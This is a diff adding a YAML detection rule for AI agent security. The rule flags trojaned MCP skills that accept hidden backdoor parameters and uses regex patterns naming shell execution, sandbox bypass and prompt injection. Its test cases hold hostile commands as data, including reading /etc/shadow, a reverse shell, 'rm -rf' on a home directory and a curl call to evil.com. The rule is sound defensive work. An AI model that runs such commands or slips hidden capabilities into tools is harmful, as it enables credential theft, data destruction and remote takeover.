@@ -1,0 +1,123 @@
+title: "Hidden Capability in MCP Skill"
+id: ATR-2026-062
+status: experimental
+description: >
+  Detects MCP skills that expose hidden or undocumented capabilities beyond their
+  declared tool schema. A skill may advertise a simple interface but accept hidden
+  parameters like "debug_mode", "admin_override", or "raw_exec" that unlock dangerous
+  functionality. This is a common pattern in trojaned MCP packages.
+author: "ATR Community"
+date: "2026/03/08"
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025 - Supply Chain Vulnerabilities"
+    - "LLM06:2025 - Excessive Agency"
+  owasp_agentic:
+    - "ASI02:2026 - Tool Misuse and Exploitation"
+    - "ASI05:2026 - Unexpected Code Execution"
+  mitre_atlas:
+    - "AML.T0010 - ML Supply Chain Compromise"
+  cve:
+    - "CVE-2025-59536"
+
+tags:
+  category: tool-poisoning
+  subcategory: hidden-capability
+  confidence: high
+
+agent_source:
+  type: tool_call
+  framework:
+    - mcp
+    - langchain
+    - autogen
+  provider:
+    - any
+
+detection:
+  conditions:
+    - field: tool_args
+      operator: regex
+      value: "(?i)(debug[_-]?mode|admin[_-]?override|raw[_-]?exec|unsafe[_-]?mode|bypass[_-]?check|no[_-]?sandbox)"
+    - field: tool_args
+      operator: regex
+      value: "(?i)(__[a-z]+__|\\$\\$[a-z]+|_internal_|_hidden_|_backdoor_|_secret_)"
+    - field: tool_args
+      operator: regex
+      value: "(?i)(eval_code|exec_raw|shell_cmd|run_arbitrary|system_call|inject_prompt)"
+    - field: tool_response
+      operator: regex
+      value: "(?i)(hidden\\s+mode\\s+activated|debug\\s+mode\\s+enabled|admin\\s+access\\s+granted|sandbox\\s+disabled)"
+  condition: any
+  false_positives:
+    - "Development/staging environments where debug modes are intentionally enabled"
+    - "Administrative tools that legitimately expose debug parameters"
+
+response:
+  actions:
+    - block_tool
+    - quarantine_session
+    - alert
+    - snapshot
+    - kill_agent
+  auto_response_threshold: critical
+  message_template: >
+    [ATR-2026-062] CRITICAL: Hidden capability detected in MCP skill. Tool arguments
+    or response indicate undocumented functionality that may be a backdoor.
+    Session quarantined. Investigate skill source immediately.
+
+test_cases:
+  true_positives:
+    - input:
+        tool_name: "note_taker"
+        tool_args: '{"text": "hello", "debug_mode": true, "raw_exec": "cat /etc/shadow"}'
+      expected: triggered
+      matched_condition: "hidden debug_mode and raw_exec parameters"
+    - input:
+        tool_name: "calculator"
+        tool_args: '{"expression": "2+2", "__backdoor__": "reverse_shell"}'
+      expected: triggered
+      matched_condition: "dunder-wrapped hidden parameter"
+    - input:
+        tool_name: "translator"
+        tool_args: '{"text": "hello", "admin_override": true, "bypass_check": true}'
+      expected: triggered
+      matched_condition: "translator with admin_override and bypass_check hidden params"
+    - input:
+        tool_name: "image_resizer"
+        tool_args: '{"image": "photo.jpg", "exec_raw": "rm -rf /home/user/*"}'
+      expected: triggered
+      matched_condition: "image tool with exec_raw hidden parameter"
+    - input:
+        tool_name: "summarizer"
+        tool_args: '{"text": "article content", "_internal_shell_cmd": "curl http://evil.com"}'
+      expected: triggered
+      matched_condition: "summarizer with _internal_ prefixed hidden parameter"
+  true_negatives:
+    - input:
+        tool_name: "debugger"
+        tool_args: '{"breakpoint": "line_42", "mode": "step"}'
+      expected: not_triggered
+      reason: "Debugger tool legitimately using debug-related terminology"
+    - input:
+        tool_name: "admin_panel"
+        tool_args: '{"action": "list_users"}'
+      expected: not_triggered
+      reason: "Admin tool using normal admin operations"
+    - input:
+        tool_name: "logger"
+        tool_args: '{"level": "debug", "message": "Connection established"}'
+      expected: not_triggered
+      reason: "Logger tool using debug level in expected context"
+    - input:
+        tool_name: "debugger"
+        tool_args: '{"breakpoint": "line_42", "mode": "step"}'
+      expected: not_triggered
+      reason: "Debugger tool legitimately using debug-related terminology"
+    - input:
+        tool_name: "admin_panel"
+        tool_args: '{"action": "list_users"}'
+      expected: not_triggered
+      reason: "Admin tool using normal admin operations"
